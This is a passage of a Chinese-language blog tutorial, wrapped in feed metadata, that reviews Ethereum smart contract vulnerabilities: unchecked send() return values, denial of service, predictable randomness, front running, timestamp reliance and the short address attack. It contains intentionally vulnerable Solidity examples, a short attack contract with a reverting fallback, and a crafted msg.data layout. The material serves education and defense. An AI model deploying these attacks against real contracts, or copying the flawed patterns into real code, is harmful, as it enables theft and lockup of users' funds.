Calls\"></a>4. Unchecked Return Values For Low Level Calls</h4> \n<p>未严格判断不安全函数调用返回值，这类型的漏洞其实很好理解，在前面讲 Reentrancy 实例的时候其实也涉及到了底层调用返回值处理验证的问题。上篇已经总结过几个底层调用函数的返回值和异常处理情况，这里再回顾一下 3 个底层调用 <code>call()</code>, <code>delegatecall()</code>, <code>callcode()</code> 和 3 个转币函数 <code>call.value()()</code>, <code>send()</code>, <code>transfer()</code>：</p> \n<p><strong>- call()</strong></p> \n<p><code>call()</code> 用于 Solidity 进行外部调用，例如调用外部合约函数 <code>&lt;address&gt;.call(bytes4(keccak(\"somefunc(params)\"), params))</code>，外部调用 <code>call()</code> 返回一个 bool 值来表明外部调用成功与否：</p> \n<p><img src=\"http://rickgray.me/images/articles/2018-05-17-ethereum-smart-contracts-vulnerabilities-review/13.png\" alt=\"\" /></p> \n<p><strong>- delegatecall()</strong></p> \n<p>除了 <code>delegatecall()</code> 会将外部代码作直接作用于合约上下文以外，其他与 <code>call()</code> 一致，同样也是只能获取一个 bool 值来表示调用成功或者失败（发生异常）。</p> \n<p><strong>- callcode()</strong></p> \n<p><code>callcode()</code> 其实是 <code>delegatecall()</code> 之前的一个版本，两者都是将外部代码加载到当前上下文中进行执行，但是在 <code>msg.sender</code> 和 <code>msg.value</code> 的指向上却有差异。</p> \n<p>例如 Alice 通过 <code>callcode()</code> 调用了 Bob 合约里同时 <code>delegatecall()</code> 了 Wendy 合约中的函数，这么说可能有点抽象，看下面的代码：</p> \n<p><img src=\"http://rickgray.me/images/articles/2018-05-17-ethereum-smart-contracts-vulnerabilities-review/14.png\" alt=\"\" /></p> \n<p>如果还是不明白 <code>callcode()</code> 与 <code>delegatecall()</code> 的区别，可以将上述代码在 remix-ide 里测试一下，观察两种调用方式在 <code>msg.sender</code> 和 <code>msg.value</code> 上的差异。</p> \n<p><strong>- call.value()()</strong></p> \n<p>在合约中直接发起 TX 的函数之一（相当危险），</p> \n<p><strong>- send()</strong></p> \n<p>通过 <code>send()</code> 函数发送 Ether 失败时直接返回 false；这里需要注意的一点就是，<code>send()</code> 的目标如果是合约账户，则会尝试调用它的 fallbcak() 函数，fallback() 函数中执行失败，<code>send()</code> 同样也只会返回 false。但由于只会提供 2300 Gas 给 fallback() 函数，所以可以防重入漏洞（恶意递归调用）。</p> \n<p><strong>- transfer()</strong></p> \n<p><code>transfer()</code> 也可以发起 Ether 交易，但与 <code>send()</code> 不同的时，<code>transfer()</code> 是一个较为安全的转币操作，当发送失败时会自动回滚状态，该函数调用没有返回值。同样的，如果 <code>transfer()</code> 的目标是合约账户，也会调用合约的 fallback() 函数，并且只会传递 2300 Gas 用于 fallback() 函数执行，可以防止重入漏洞（恶意递归调用）。</p> \n<p>这里以一个简单的示例来说明严格验证底层调用返回值的重要性：</p> \n<figure class=\"highlight javascript\"> \n <table> \n  <tr> \n   <td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">withdraw</span>(<span class=\"params\">uint256 _amount</span>) <span class=\"title\">public</span> </span>{</span><br><span class=\"line\"><span class=\"built_in\">require</span>(balances[msg.sender] &gt;= _amount);</span><br><span class=\"line\">balances[msg.sender] -= _amount;</span><br><span class=\"line\">etherLeft -= _amount;</span><br><span class=\"line\">msg.sender.send(_amount);  <span class=\"comment\">// 未验证 send() 返回值，若 msg.sender 为合约账户 fallback() 调用失败，则 send() 返回 false</span></span><br><span class=\"line\">}</span><br /></br></br></br></br></br></pre></td> \n  </tr> \n </table> \n</figure> \n<p>上面给出的提币流程中使用 <code>send()</code> 函数进行转账，因为这里没有验证 <code>send()</code> 返回值，如果 msg.sender 为合约账户 fallback() 调用失败，则 send() 返回 false，最终导致账户余额减少了，钱却没有拿到。</p> \n<p>关于该类问题可以详细了解一下 <a href=\"https://www.kingoftheether.com/postmortem.html\" target=\"_blank\" rel=\"noopener\">King of the Ether</a>。</p> \n<h4 id=\"5-Denial-of-Service-拒绝服务\"><a href=\"http://rickgray.me/2018/05/17/ethereum-smart-contracts-vulnerabilities-review/#5-Denial-of-Service-拒绝服务\" class=\"headerlink\" title=\"5. Denial of Service - 拒绝服务\"></a>5. Denial of Service - 拒绝服务</h4> \n<p>DoS 无处不在，在 Solidity 里也是，与其说是拒绝服务漏洞不如简单的说成是 “不可恢复的恶意操作或者可控制的无限资源消耗”。简单的说就是对以太坊合约进行 DoS 攻击，可能导致 Ether 和 Gas 的大量消耗，更严重的是让原本的合约代码逻辑无法正常运行。</p> \n<p>下面一个例子（代码改自 DASP 中例子）：</p> \n<figure class=\"highlight javascript\"> \n <table> \n  <tr> \n   <td class=\"code\"><pre><span class=\"line\">pragma solidity ^<span class=\"number\">0.4</span><span class=\"number\">.10</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">contract PresidentOfCountry {</span><br><span class=\"line\">    address public president;</span><br><span class=\"line\">    uint256 price;</span><br><span class=\"line\"></span><br><span class=\"line\"> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">PresidentOfCountry</span>(<span class=\"params\">uint256 _price</span>) </span>{</span><br><span class=\"line\"> <span class=\"built_in\">require</span>(_price &gt; <span class=\"number\">0</span>);</span><br><span class=\"line\"> price = _price;</span><br><span class=\"line\"> president = msg.sender;</span><br><span class=\"line\"> }</span><br><span class=\"line\"></span><br><span class=\"line\"> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">becomePresident</span>(<span class=\"params\"></span>) <span class=\"title\">payable</span> </span>{</span><br><span class=\"line\"> <span class=\"built_in\">require</span>(msg.value &gt;= price); <span class=\"comment\">// must pay the price to become president</span></span><br><span class=\"line\"> president.transfer(price); <span class=\"comment\">// we pay the previous president</span></span><br><span class=\"line\"> president = msg.sender; <span class=\"comment\">// we crown the new president</span></span><br><span class=\"line\"> price = price * <span class=\"number\">2</span>; <span class=\"comment\">// we double the price to become president</span></span><br><span class=\"line\"> }</span><br><span class=\"line\">}</span><br /></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></pre></td> \n  </tr> \n </table> \n</figure> \n<p>一个简单的类似于 KingOfEther 的合约，按合约的正常逻辑任何出价高于合约当前 <code>price</code> 的都能成为新的 president，原有合约里的存款会返还给上一人 president，并且这里也使用了 <code>transfer()</code> 来进行 Ether 转账，看似没有问题的逻辑，但不要忘了，以太坊中有两类账户类型，如果发起 <code>becomePresident()</code> 调用的是个合约账户，并且成功获取了 president，如果其 fallback() 函数恶意进行了类似 <code>revert()</code> 这样主动跑出错误的操作，那么其他账户也就无法再正常进行 becomePresident 逻辑成为 president 了。</p> \n<p>简单的攻击代码如下：</p> \n<figure class=\"highlight plain\"> \n <table> \n  <tr> \n   <td class=\"code\"><pre><span class=\"line\">contract Attack {</span><br><span class=\"line\">    function () { revert(); }</span><br><span class=\"line\">    </span><br><span class=\"line\">    function Attack(address _target) payable {</span><br><span class=\"line\">        _target.call.value(msg.value)(bytes4(keccak256(\"becomePresident()\")));</span><br><span class=\"line\"> }</span><br><span class=\"line\">}</span><br /></br></br></br></br></br></br></pre></td> \n  </tr> \n </table> \n</figure> \n<p>使用 remix-ide 模拟攻击流程：</p> \n<p><img src=\"http://rickgray.me/images/articles/2018-05-17-ethereum-smart-contracts-vulnerabilities-review/president_of_country_demo.gif\" alt=\"\" /></p> \n<h4 id=\"6-Bad-Randomness-可预测的随机处理\"><a href=\"http://rickgray.me/2018/05/17/ethereum-smart-contracts-vulnerabilities-review/#6-Bad-Randomness-可预测的随机处理\" class=\"headerlink\" title=\"6. Bad Randomness - 可预测的随机处理\"></a>6. Bad Randomness - 可预测的随机处理</h4> \n<p>伪随机问题一直都存在于现代计算机系统中，但是在开放的区块链中，像在以太坊智能合约中编写的基于随机数的处理逻辑感觉就有点不切实际了，由于人人都能访问链上数据，合约中的存储数据都能在链上查询分析得到。如果合约代码没有严格考虑到链上数据公开的问题去使用随机数，可能会被攻击者恶意利用来进行 “作弊”。</p> \n<p>摘自 DASP 的代码块：</p> \n<figure class=\"highlight javascript\"> \n <table> \n  <tr> \n   <td class=\"code\"><pre><span class=\"line\">uint256 private seed;</span><br><span class=\"line\">    </span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">play</span>(<span class=\"params\"></span>) <span class=\"title\">public</span> <span class=\"title\">payable</span> </span>{</span><br><span class=\"line\"><span class=\"built_in\">require</span>(msg.value &gt;= <span class=\"number\">1</span> ether);</span><br><span class=\"line\">iteration++;</span><br><span class=\"line\">uint randomNumber = uint(keccak256(seed + iteration));</span><br><span class=\"line\"><span class=\"keyword\">if</span> (randomNumber % <span class=\"number\">2</span> == <span class=\"number\">0</span>) {</span><br><span class=\"line\">msg.sender.transfer(<span class=\"keyword\">this</span>.balance);</span><br><span class=\"line\">}</span><br><span class=\"line\">}</span><br /></br></br></br></br></br></br></br></br></br></pre></td> \n  </tr> \n </table> \n</figure> \n<p>这里 <code>seed</code> 变量被标记为了私有变量，前面有说过链上的数据都是公开的，<code>seed</code> 的值可以通过扫描与该合约相关的 TX 来获得。获取 <code>seed</code> 值后，同样的 <code>iteration</code> 值也是可以得到的，那么整个 <code>uint(keccak256(seed + iteration))</code> 的值就是可预测的了。</p> \n<p>就 DASP 里面提到的，还有一些合约喜欢用 <code>block.blockhash(uint blockNumber) returns (bytes32)</code> 来获取一个随机哈希，但是这里切记不能使用 <code>block.number</code> 也就是当前块号来作为 <code>blockNumber</code> 的值，因为在官方文档中明确写了：</p> \n<blockquote> \n <p>block.blockhash(uint blockNumber) returns (bytes32): hash of the given block - only works for 256 most recent blocks excluding current</p> \n</blockquote> \n<p>意思是说 <code>block.blockhash()</code> 只能使用近 256 个块的块号来获取 Hash 值，并且还强调了不包含当前块，如果使用当前块进行计算 <code>block.blockhash(block.numbber)</code> 其结果始终为 <code>0x0000000.....</code>：</p> \n<p><img src=\"http://rickgray.me/images/articles/2018-05-17-ethereum-smart-contracts-vulnerabilities-review/15.png\" alt=\"\" /></p> \n<p>同样的也不能使用 <code>block.timestamp</code>, <code>now</code> 这些可以由矿工控制的值来获取随机数。</p> \n<p>一切链上的数据都是公开的，想要获取一个靠谱的随机数，使用链上的数据看来是比较难做到的了，这里有一个独立的项目 <a href=\"https://github.com/oraclize/ethereum-api\" target=\"_blank\" rel=\"noopener\">Oraclize</a> 被设计来让 Smart Contract 与互联网进行交互，有兴趣的同学可以深入了解一下。（附上基于 Oraclize 的随机数获取方法 <a href=\"https://github.com/oraclize/ethereum-examples/blob/master/solidity/random-datasource/randomExample.sol\" target=\"_blank\" rel=\"noopener\">randomExample</a>）</p> \n<h4 id=\"7-Front-Running-提前交易\"><a href=\"http://rickgray.me/2018/05/17/ethereum-smart-contracts-vulnerabilities-review/#7-Front-Running-提前交易\" class=\"headerlink\" title=\"7. Front Running - 提前交易\"></a>7. Front Running - 提前交易</h4> \n<p>“提前交易”，其实在学习以太坊智能合约漏洞之前，我还并不知道这类漏洞类型或者说是攻击手法（毕竟我对金融一窍不通）。简单来说，“提前交易”就是某人提前获取到交易者的具体交易信息（或者相关信息），抢在交易者完成操作之前，通过一系列手段（通常是提高报价）来抢在交易者前面完成交易。</p> \n<p><img src=\"http://rickgray.me/images/articles/2018-05-17-ethereum-smart-contracts-vulnerabilities-review/16.png\" alt=\"\" /></p> \n<p>在以太坊中所有的 TX 都需要经过确认才能完全记录到链上，而每一笔 TX 都需要带有相关手续费，而手续费的多少也决定了该笔 TX 被矿工确认的优先级，手续费高的 TX 会被优先得到确认，而每一笔待确认的 TX 在广播到网络之后就可以查看具体的交易详情，一些涉及到合约调用的详细方法和参数可以被直接获取到。那么这里显然就有 Front-Running 的隐患存在了，示例代码就不举了，直接上图（形象一点）：</p> \n<p><img src=\"http://rickgray.me/images/articles/2018-05-17-ethereum-smart-contracts-vulnerabilities-review/17.png\" alt=\"\" /></p> \n<p>在 <a href=\"https://etherscan.io/txsPending\" target=\"_blank\" rel=\"noopener\">etherscan.io</a> 就能看到还未被确认的 TX，并且能给查看相关数据：</p> \n<p><img src=\"http://rickgray.me/images/articles/2018-05-17-ethereum-smart-contracts-vulnerabilities-review/18.png\" alt=\"\" /></p> \n<p><strong>（当然了，为了防止信息明文存储在 TX 中，可以对数据进行加密和签名）</strong></p> \n<h4 id=\"8-Time-Manipulation\"><a href=\"http://rickgray.me/2018/05/17/ethereum-smart-contracts-vulnerabilities-review/#8-Time-Manipulation\" class=\"headerlink\" title=\"8. Time Manipulation\"></a>8. Time Manipulation</h4> \n<p>“时间篡改”（DASP 给的名字真抽象 XD），说白了一切与时间相关的漏洞都可以归为 “Time Manipulation”。在 Solidity 中，<code>block.timestamp</code> （别名 <code>now</code>）是受到矿工确认控制的，也就是说一些合约依赖于 <code>block.timestamp</code> 是有被攻击利用的风险的，当攻击者有机会作为矿工对 TX 进行确认时，由于 <code>block.timestamp</code> 可以控制，一些依赖于此的合约代码即预知结果，攻击者可以选择一个合适的值来到达目的。（当然了 <code>block.timestamp</code> 的值通常有一定的取值范围，出块间隔有规定 XD）</p> \n<p>该类型我还没有找到一个比较好的例子，所以这里就不给代码演示了。:)</p> \n<h4 id=\"9-Short-Address-Attack-短地址攻击\"><a href=\"http://rickgray.me/2018/05/17/ethereum-smart-contracts-vulnerabilities-review/#9-Short-Address-Attack-短地址攻击\" class=\"headerlink\" title=\"9. Short Address Attack - 短地址攻击\"></a>9. Short Address Attack - 短地址攻击</h4> \n<p>在我着手测试和复现合约漏洞类型时，短地址攻击我始终没有在 remix-ide 上测试成功（道理我都懂，咋就不成功呢？）。虽然漏洞没有复现，但是漏洞原理我还是看明白了，下面就详细地说明一下短地址攻击的漏洞原理吧。</p> \n<p>首先我们以外部调用 <code>call()</code> 为例，外部调用中 <code>msg.data</code> 的情况：</p> \n<p><img src=\"http://rickgray.me/images/articles/2018-05-17-ethereum-smart-contracts-vulnerabilities-review/19.png\" alt=\"\" /></p> \n<p>在 remix-ide 中部署此合约并调用 <code>callFunc()</code> 时，可以得到日志输出的 <code>msg.data</code> 值：</p> \n<figure class=\"highlight plain\"> \n <table> \n  <tr> \n   <td class=\"code\"><pre><span class=\"line\">0x4142c000000000000000000000000000000000000000000000000000000000000000001e</span><br /></pre></td> \n  </tr> \n </table> \n</figure> \n<p>其中 <code>0x4142c000</code> 为外部调用的函数名签名头 4 个字节（<code>bytes4(keccak256(\"foo(uint32,bool)\"))</code>），而后面 32 字节即为传递的参数值，<code>msg.data</code> 一共为 4 字节函数签名加上 32 字节参数值，总共 <code>4+32</code> 字节。</p> \n<p>看如下合约代码：</p> \n<figure class=\"highlight javascript\"> \n <table> \n  <tr> \n   <td class=\"code\"><pre><span class=\"line\">pragma solidity ^<span class=\"number\">0.4</span><span class=\"number\">.10</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">contract ICoin {</span><br><span class=\"line\">    address owner;</span><br><span class=\"line\">    mapping (<span class=\"function\"><span class=\"params\">address</span> =&gt;</span> uint256) public balances;</span><br><span class=\"line\"></span><br><span class=\"line\"> modifier OwnerOnly() { <span class=\"built_in\">require</span>(msg.sender == owner); _; }</span><br><span class=\"line\"> </span><br><span class=\"line\"> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">ICoin</span>(<span class=\"params\"></span>) </span>{ owner = msg.sender; }</span><br><span class=\"line\"> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">approve</span>(<span class=\"params\">address _to, uint256 _amount</span>) <span class=\"title\">OwnerOnly</span> </span>{ balances[_to] += _amount; }</span><br><span class=\"line\"> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">transfer</span>(<span class=\"params\">address _to, uint256 _amount</span>) </span>{</span><br><span class=\"line\"> <span class=\"built_in\">require</span>(balances[msg.sender] &gt; _amount);</span><br><span class=\"line\"> balances[msg.sender] -= _amount;</span><br><span class=\"line\"> balances[_to] += _amount;</span><br><span class=\"line\"> }</span><br><span class=\"line\">}</span><br /></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></pre></td> \n  </tr> \n </table> \n</figure> \n<p>具体代币功能的合约 ICoin，当 A 账户向 B 账户转代币时调用 <code>transfer()</code> 函数，例如 A 账户（0x14723a09acff6d2a60dcdf7aa4aff308fddc160c）向 B 账户（0x4b0897b0513fdc7c541b6d9d7e929c4e5364d2db）转 8 个 ICoin，<code>msg.data</code> 数据为：</p> \n<figure class=\"highlight plain\"> \n <table> \n  <tr> \n   <td class=\"code\"><pre><span class=\"line\">0xa9059cbb  -&gt; bytes4(keccak256(\"transfer(address,uint256)\")) 函数签名</span><br><span class=\"line\">0000000000000000000000004b0897b0513fdc7c541b6d9d7e929c4e5364d2db  -&gt; B 账户地址（前补 0 补齐 32 字节）</span><br><span class=\"line\">0000000000000000000000000000000000000000000000000000000000000008  -&gt; 0x8（前补 0 补齐 32 字节）</span><br /></br></br></pre></td> \n  </tr> \n </table> \n</figure> \n<p>那么短地址攻击是怎么做的呢，攻击者找到一个末尾是 <code>00</code> 账户地址，假设为 <code>0x4b0897b0513fdc7c541b6d9d7e929c4e5364d200</code>，那么正常情况下整个调用的 <code>msg.data</code> 应该为：</p> \n<figure class=\"highlight plain\"> \n <table> \n  <tr> \n   <td class=\"code\"><pre><span class=\"line\">0xa9059cbb  -&gt; bytes4(keccak256(\"transfer(address,uint256)\")) 函数签名</span><br><span class=\"line\">0000000000000000000000004b0897b0513fdc7c541b6d9d7e929c4e5364d200  -&gt; B 账户地址（注意末尾 00）</span><br><span class=\"line\">0000000000000000000000000000000000000000000000000000000000000008  -&gt; 0x8（前补 0 补齐 32 字节）</span><br /></br></br></pre></td> \n  </tr> \n </table> \n</figure> \n<p>但是如果我们将 B 地址的 <code>00</code> 吃掉，不进行传递，也就是说我们少传递 1 个字节变成 <code>4+31+32</code>：</p> \n<figure class=\"highlight plain\"> \n <table> \n  <tr> \n   <td class=\"code\"><pre><span class=\"line\">0xa9059cbb  -&gt; bytes4(keccak256(\"transfer(address,uint256)\")) 函数签名</span><br><span class=\"line\">0000000000000000000000004b0897b0513fdc7c541b6d9d7e929c4e5364d2  -&gt; B 地址（31 字节）</span><br><span class=\"line\">0000000000000000000000000000000000000000000000000000000000000008  -&gt; 0x8（前补 0 补齐 32 字节）</span><br /></br></br></pre></td> \n  </tr> \n </table> \n</figure> \n<p>当上面数据进入 EVM 进行处理时，会犹豫参数对齐的问题后补 <code>00</code> 变为：</p> \n<figure class=\"highlight plain\"> \n <table> \n  <tr> \n   <td class=\"code\"><pre><span class=\"line\">0xa9059cbb</span><br><span class=\"line\">0000000000000000000000004b0897b0513fdc7c541b6d9d7e929c4e5364d200</span><br><span class=\"line\">0000000000000000000000000000000000000000000000000000000000000800</span><br /></br></br></pre></td> \n  </tr> \n </table> \n</figure> \n<p>也就是说，恶意构造的 <code>msg.data</code> 通过 EVM 解析补 0 操作，导致原本 <code>0x8 = 8</code> 变为了 <code>0x800 = 2048</code>。</p> \n<p>上述 EVM 对畸形字节的 <code>msg.data</code> 进行补位操作的行为其实就是短地址攻击的原理（但这里我真的没有复现成功，希望有成功的同学联系我一起交流）。</p> \n<p>短地址攻击通常发生在接受畸形地址的地方，如交易所提币、钱包转账，所以除了在编写合约的时候需要严格验证输入数据的正确性，而且在 Off-Chain 的业务功能上也要对用户所输入的地址格式进行验证，防止短地址攻击的发生。</p> \n<p>同时，老外有一篇介绍 <a href=\"https://ericrafaloff.com/analyzing-the-erc20-short-address-attack/\" target=\"_blank\" rel=\"noopener\">Analyzing the ERC20 Short Address Attack</a> 原理的文章我觉得非常值得学习。</p> \n<h4 id=\"Unknown-Unknowns-其他未知，-未知漏洞，没啥好讲的，为了跟-DASP-保持一致而已\"><a href=\"http://rickgray.me/2018/05/17/ethereum-smart-contracts-vulnerabilities-review/#Unknown-Unknowns-其他未知，-未知漏洞，没啥好讲的，为了跟-DASP-保持一致而已\" class=\"headerlink\" title=\"- Unknown Unknowns - 其他未知，:) 未知漏洞，没啥好讲的，为了跟 DASP 保持一致而已\"></a>- Unknown Unknowns - 其他未知，:) 未知漏洞，没啥好讲的，为了跟 DASP 保持一致而已</h4> \n<h3 id=\"III-自我思考\"><a href=\"http://rickgray.me/2018/05/17/ethereum-smart-contracts-vulnerabilities-review/#III-自我思考\" class=\"headerlink\" title=\"III. 自我思考\"></a>III. 自我思考</h3> \n<p>前后花了 2 周多的时间去看以太坊智能合约相关知识以及本文（上/下）的完成，久违的从 0 到 1 的感觉又回来了。多的不说了，我应该也算是以太坊智能合约安全入门了吧，近期出的一些合约漏洞事件也在跟，分析和复现也是完全 OK 的，漏洞研究原理不变，变得只是方向而已。期待同更多的区块链安全研究者交流和学习。</p> \n<h4 id=\"1-以太坊中合约账户的私钥在哪？可以不通过合约账户代码直接操作合约账户中的-Ether-吗？\"><a href=\"http://rickgray.me/2018/05/17/ethereum-smart-contracts-vulnerabilities-review/#1-以太坊中合约账户的私钥在哪？可以不通过合约账户代码直接操作合约账户中的-Ether-吗？\" class=\"headerlink\" title=\"1. 以太坊中合约账户的私钥在哪？可以不通过合约账户代码直接操作合约账户中的 Ether 吗？\"></a>1. 以太坊中合约账户的私钥在哪？可以不通过合约账户代码直接操作合约账户中的 Ether 吗？</h4> \n<p>StackExchange 上有相关问题的回答 <a href=\"https://ethereum.stackexchange.com/questions/185/where-is-the-private-key-for-a-contract-stored\" target=\"_blank\" rel=\"noopener\">“Where is the private key for a contract stored?”</a>，但是我最终也没有看到比较官方的答案。但可以知道的就是，合约账户是由部署时的合约代码控制的，<strong>不确定是否有私钥可以直接控制合约进行 Ether 相关操作</strong>（讲道理应该是不行的）。</p> \n<h4 id=\"2-使用-keccak256-进行函数签名时的坑？-参数默认位数标注\"><a href=\"http://rickgray.me/2018/05/17/ethereum-smart-contracts-vulnerabilities-review/#2-使用-keccak256-进行函数签名时的坑？-参数默认位数标注\" class=\"headerlink\" title=\"2. 使用 keccak256() 进行函数签名时的坑？- 参数默认位数标注\"></a>2. 使用 keccak256() 进行函数签名时的坑？- 参数默认位数标注</h4> \n<p>在使用 keccak256 对带参函数进行签名时，需要注意要严格制定参数类型的位数，如：</p> \n<figure class=\"highlight javascript\"> \n <table> \n  <tr> \n   <td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">somefunc</span>(<span class=\"params\">uint n</span>) </span>{ ... }</span><br /></pre></td> \n  </tr> \n </table> \n</figure> \n<p>对上面函数进行签名时，定义时参数类型为 <code>uint</code>，而 <code>uint</code> 默认为 256 位，也就是 <code>uint256</code>，所以在签名时应该为 <code>keccak256(\"somefunc(uint256)\")</code>，千万不能写成 <code>keccak256(\"somefunc(uint)\")</code>。</p> \n<h3 id=\"参考链接：\"><a href=\"http://rickgray.me/2018/05/17/ethereum-smart-contracts-vulnerabilities-review/#参考链接：\" class=\"headerlink\" title=\"参考链接：\"></a>参考链接：</h3> \n<ul> \n <li><a href=\"http://solidity.readthedocs.io/en/v0.4.21/contracts.html#fallback-function\" target=\"_blank\" rel=\"noopener\">http://solidity.readthedocs.io/en/v0.4.21/contracts.html#fallback-function</a></li> \n <li><a href=\"https://consensys.github.io/smart-contract-best-practices/recommendations/#be-aware-of-the-tradeoffs-between-send-transfer-and-callvalue\" target=\"_blank\" rel=\"noopener\">https://consensys.github.io/smart-contract-best-practices/recommendations/#be-aware-of-the-tradeoffs-between-send-transfer-and-callvalue</a></li> \n <li><a href=\"http://www.cryptologie.net/\" target=\"_blank\" rel=\"noopener\">http://www.cryptologie.net/</a></li> \n <li><a href=\"https://ethereum.stackexchange.com/questions/7570/whats-a-fallback-function-when-using-address-send\" target=\"_blank\" rel=\"noopener\">https://ethereum.stackexchange.com/questions/7570/whats-a-fallback-function-when-using-address-send</a></li> \n <li><a href=\"https://www.dasp.co/\" target=\"_blank\" rel=\"noopener\">https://www.dasp.co/</a></li> \n <li><a href=\"https://www.youtube.com/playlist?list=PLUMwusiHZZhpf8ItZBkR95ekkMGNKvuNR\" target=\"_blank\" rel=\"noopener\">https://www.youtube.com/playlist?list=PLUMwusiHZZhpf8ItZBkR95ekkMGNKvuNR</a></li> \n <li><a href=\"http://solidity.readthedocs.io/en/v0.4.21/units-and-global-variables.html#special-variables-and-functions\" target=\"_blank\" rel=\"noopener\">http://solidity.readthedocs.io/en/v0.4.21/units-and-global-variables.html#special-variables-and-functions</a></li> \n <li><a href=\"https://github.com/oraclize/ethereum-api\" target=\"_blank\" rel=\"noopener\">https://github.com/oraclize/ethereum-api</a></li> \n <li><a href=\"https://ericrafaloff.com/analyzing-the-erc20-short-address-attack/\" target=\"_blank\" rel=\"noopener\">https://ericrafaloff.com/analyzing-the-erc20-short-address-attack/</a></li> \n</ul>","descriptionType":"html","publishedDate":"Wed, 16 May 2018 16:00:00 +0000","feedId":31458,"bgimg":"http://rickgray.me/images/articles/2018-05-17-ethereum-smart-contracts-vulnerabilities-review/1.png","linkMd5":"4f7462976023f2a6e0cd00e9a4e557c7","bgimgJsdelivr":"https://cdn.jsdelivr.net/gh/myreaderx3/cdn1@2020_2/2020/09/06/21-00-16-393_462ccf494729d41d.webp","destWidth":765,"destHeight":430,"sourceBytes":21732,"destBytes":29730,"author":"","articleImgCdnMap":{"http://rickgray.me/images/articles/2018-05-17-ethereum-smart-contracts-vulnerabilities-review/1.png":"https://cdn.jsdelivr.net/gh/myreaderx3/cdn1@2020_2/2020/09/06/21-00-16-393_462ccf494729d41d.webp","http://rickgray.me/images/articles/2018-05-17-ethereum-smart-contracts-vulnerabilities-review/2.png":"https://cdn.jsdelivr.net/gh/myreaderx4/cdn10@2020_4/2020/09/06/21-00-18-169_a132cbcdc7859cba.webp","http://rickgray.me/images/articles/2018-05-17-ethereum-smart-contracts-vulnerabilities-review/4.png":"https://cdn.jsdelivr.net/gh/myreaderx15/cdn26@2020_1/2020/09/06/21-00-17-852_d10713a9c1106ed0.webp","http://rickgray.me/images/articles/2018-05-17-ethereum-smart-contracts-vulnerabilities-review/3.png":"https://cdn.jsdelivr.net/gh/myreaderx10/cdn6@2020_2/2020/09/06/21-00-17-900_c60524383954d423.webp","http://rickgray.me/images/articles/2018-05-17-ethereum-smart-contracts-vulnerabilities-review/6.png":"https://cdn.jsdelivr.net/gh/myreaderx12/cdn34@2020_2/2020/09/06/21-00-17-869_8fb1019b149ade28.webp","http://rickgray.me/images/articles/2018-05-17-ethereum-smart-contracts-vulnerabilities-review/reentrancy_demo.gif":null,"http://rickgray.me/images/articles/2018-05-17-ethereum-smart-contracts-vulnerabilities-review/7.png":"https://cdn.jsdelivr.net/gh/myreaderx27/cdn38@2020_5/2020/09/06/21-00-17-801_cc53b744850228c4.webp","http://rickgray.me/images/articles/2018-05-17-ethereum-smart-contracts-vulnerabilities-review/delegatecall_demo.gif":null,"http://rickgray.me/images/articles/2018-05-17-ethereum-smart-contracts-vulnerabilities-review/8.png":"https://cdn.jsdelivr.net/gh/myreaderx5oss/cdn42@2020_2/2020/09/06/21-00-17-787_4b2883dc64771194.webp","http://rickgray.me/images/articles/2018-05-17-ethereum-smart-contracts-vulnerabilities-review/9.png":null,"http://rickgray.me/images/articles/2018-05-17-ethereum-smart-contracts-vulnerabilities-review/integer_down_overflow.gif":null,"http://rickgray.me/images/articles/2018-05-17-ethereum-smart-contracts-vulnerabilities-review/13.png":"https://cdn.jsdelivr.net/gh/myreaderx8/cdn61@2020_3/2020/09/06/21-00-18-305_cd034959acf311af.webp","http://rickgray.me/images/articles/2018-05-17-ethereum-smart-contracts-vulnerabilities-review/14.png":"https://cdn.jsdelivr.net/gh/myreaderx32/cdn71@2020_1/2020/09/06/21-00-18-508_2f03426988542cbd.webp","http://rickgray.me/images/articles/2018-05-17-ethereum-smart-contracts-vulnerabilities-review/president_of_country_demo.gif":"https://cdn.jsdelivr.net/gh/myreaderx6/cdn58@2020_5/2020/09/06/21-02-15-173_032bc354319627b3.webp","http://rickgray.me/images/articles/2018-05-17-ethereum-smart-contracts-vulnerabilities-review/15.png":"https://cdn.jsdelivr.net/gh/myreaderx33/cdn70@2020_4/2020/09/06/21-00-17-892_ca81e106a722ad14.webp","http://rickgray.me/images/articles/2018-05-17-ethereum-smart-contracts-vulnerabilities-review/16.png":"https://cdn.jsdelivr.net/gh/myreaderx24/cdn7@2020_6/2020/09/06/21-00-17-879_0468f72ec23992dd.webp","http://rickgray.me/images/articles/2018-05-17-ethereum-smart-contracts-vulnerabilities-review/17.png":"https://cdn.jsdelivr.net/gh/myreaderx13/cdn16@2020_4/2020/09/06/21-00-18-149_274f157800e006b9.webp","http://rickgray.me/images/articles/2018-05-17-ethereum-smart-contracts-vulnerabilities-review/18.png":"https://cdn.jsdelivr.net/gh/myreaderx2/cdn21@2020_2/2020/09/06/21-00-17-925_ede35775d27b9687.webp","http://rickgray.me/images/articles/2018-05-17-ethereum-smart-contracts-vulnerabilities-review/19.png":"https://cdn.jsdelivr.net/gh/myreaderx22/cdn29@2020_6/2020/09/06/21-00-18-067_d7b4f593137fc7a5.webp"},"publishedOrCreatedDate":1599426012399}],"record":{"createdTime":"2020-09-07 05:00:12","updatedTime":"2020-09-07 05:00:12","feedId":31458,"fetchDate":"Sun, 06 Sep 2020 21:00:12 